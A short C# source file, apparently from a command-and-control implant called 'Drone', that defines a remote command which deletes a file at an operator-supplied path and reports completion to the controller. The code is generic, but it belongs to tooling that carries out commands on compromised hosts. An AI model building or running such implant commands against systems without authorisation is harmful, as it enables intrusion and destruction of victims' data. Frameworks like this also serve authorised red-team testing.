﻿using System.IO;
using System.Threading;
using System.Threading.Tasks;

using Drone.Models;

namespace Drone.Commands;

public sealed class RemoveFile : DroneCommand
{
    public override byte Command => 0x07;
    
    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        File.Delete(task.Arguments[0]);
        await Drone.SendTaskComplete(task);
    }
}